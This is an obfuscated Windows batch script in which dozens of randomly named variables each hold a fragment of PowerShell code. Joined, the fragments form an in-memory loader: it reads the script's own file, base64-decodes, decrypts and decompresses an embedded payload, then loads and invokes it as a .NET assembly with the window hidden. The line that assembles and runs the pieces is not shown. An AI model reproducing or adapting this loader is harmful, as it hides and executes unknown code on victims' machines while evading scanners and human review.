@echo off
set "vvPoBEkDbc= = N"
set "yQlQIpQQTS=esMa"
set "MEKvsiwpXs=BMKv"
set "weoZewfzjX=A = "
set "MLhANMvtHV=]::("
set "pffmgEQbrr=; };"
set "DHBAESdVSv=File"
set "LpgkGlMqCp=.Cop"
set "BNBxtURcWg=ert]"
set "LphOWTrzTv=7kGw"
set "HnMiNtgUMT=1] -"
set "zRxhRCXdow=zInA"
set "TMARRAtucB=m(, "
set "HjliQDxUsS=Disp"
set "QnSPiLQOUA=('%*'"
set "mHWgMFsDTC=embl"
set "PzwXHSycmq=lit("
set "LHHDomGUwf=y]::"
set "ybgSpZOswQ=ay()"
set "LIIfbpDVkx=.-16"
set "oLDzFbUDAO=).Sp"
set "awopugbazY=.IO."
set "qvaYnRNjpi=n ''"
set "ueFZgmdExj=oG ="
set "cWwQHtiPAq=lD.I"
set "UdMLUZcxKM== $i"
set "IzLVDqRsPL=]::("
set "tRVqtNOjkw=();$"
set "KeFzLEGKGc=fyP."
set "QBOjCFxiMY=Wyqo"
set "eqYhBgXXdN=;$oL"
set "JIsgfUioBL=-nop"
set "IoRwQEbGdX=ddin"
set "IEPtfWRHti=tryP"
set "CaJfEaHpag=ment"
set "MQnuMtHzxu=ioR "
set "XKVhGgyqCO=comm"
set "lUNQhaBjQX=Obje"
set "QYkOiRPcUT=ach "
set "vqvPHKweDZ=am;$"
set "zdmHZwVkQN=('%~f0'"
set "vnpomvgMVF=rity"
set "YYTHduWihQ=ring"
set "QhaRlSkCZI='oPV"
set "CRbwDZpnWM=flec"
set "dbwRRfFlpg=1..-"
set "tzGdHLCPRu=.Con"
set "jitIwIcfip=stem"
set "HAlwPGecaD=ew-O"
set "FDoQJaJNQx=oint"
set "bsgwqsJsat=oR.T"
set "KwAYiiEKRh=$aza"
set "tYNXsKvvnx=);$i"
set "gLckXNEfgX=T = "
set "iBqRyyTuYf=pxlD"
set "aqEckViOBt=S46e"
set "kUYMDbObCv=saBm"
set "EYJNJVVaOl=rity"
set "fITevOHFCC=.GZi"
set "lsEqrLdEgb=Secu"
set "qSzUagxXrZ=DWP "
set "GUMdUqnZth=gnir"
set "RibliHptZb='txe"
set "ACNfjtRlxb=Mode"
set "HSTYXakGYc=);$J"
set "QmePKYpbms= [st"
set "MKbZlAZzJR=Stre"
set "ygsshwZZhs=NKTN"
set "OzSSXJkTIE=('da"
set "WZIuEWRcsZ=tion"
set "caoYzyAwls= = ["
set "XiCirCjley=BMKv"
set "PZCbBDDovK=TN);"
set "BAFNTeEbvJ=[]] "
set "baZSZnAeIZ=ioR."
set "urZTsojgkS=);$o"
set "TQbDvrbvLk=ct S"
set "AmBsVZeRcm=ptor"
set "xuNkAJGJzf=stem"
set "YJaCqDseUs=THxh"
set "HXpKsDAjaQ=em.I"
set "PYmGJAZguW='')("
set "szjLTrGqmC=..-1"
set "tOHfSYwajN=Disp"
set "GhKiUvhkhk=pxlD"
set "euyCxTwrQd=ck($"
set "pANGrzqKSn=Invo"
set "DSRjTYMTbn=-joi"
set "EnjQoEldTB=-1.."
set "rwuFegQQzD=, $B"
set "PRpqeQCPYn=.Com"
set "RezoegoaAS=$JNK"
set "HFrtKaGJON=tem."
set "vFVQUIiiqz=();$"
set "NWnsvwMTzf=.Cry"
set "vBLWdFTovH= '')"
set "QaGFolMwnh=TN.T"
set "RzsiBYBKSP=ateD"
set "NLiVNtoGpX=aLT."
set "jXKHWgWxoU=TN ="
set "SUMYmirTnz=IoO3"
set "iImwltclpz=orF'"
set "nSrtobXXDP= if "
set "DeAbpBkpeV=iron"
set "izeMJhRGFq=Star"
set "UpzDsdXRJW=New-"
set "ZOktbRYDOd=ct S"
set "yhahlnLLuM=)($B"
set "ZjZTstroNg=YWOo"
set "mietTBZmEx=[Sys"
set "UQSZRUxkzm=:('g"
set "LDDDilXlcW=m.IO"
set "IYxHJIUsNE=ode]"
set "ecZpYGbxDd=morF"
set "LhuMhdKBTx=FcNh"
set "rapSaZnXdr=oArr"
set "QtDXmcoNcs=x = "
set "wMpaEvgbbm=$YWO"
set "AfYWdNjFLk=CuSj"
set "McQiaBHfpQ=ionM"
set "sDfnHrIMea=:: '"
set "dKDAwYEKtd=.Dis"
set "xpjbvVAvGP=ect "
set "aLlaykuLMX=('ev"
set "uyVpSwkTdZ=-joi"
set "KEDpuMiuTt=vx ="
set "feqQYpzdSB=$xzI"
set "xkZxxXWVAm=t Sy"
set "JiVOFnAWNj=form"
set "fyXtlcmPVY=rtS4"
set "PVZstooisT=[Env"
set "ZfatsmXEmD=comp"
set "UbTKxTNKzr=6esa"
set "emgHoFoVpr=e]::"
set "VGZTLcVdCh=lBlo"
set "NWLNQkAwWn=ecry"
set "zVZUJIExCU=.Cre"
set "SGbtqFTLIv=onve"
set "wHFSlPsPaO=ress"
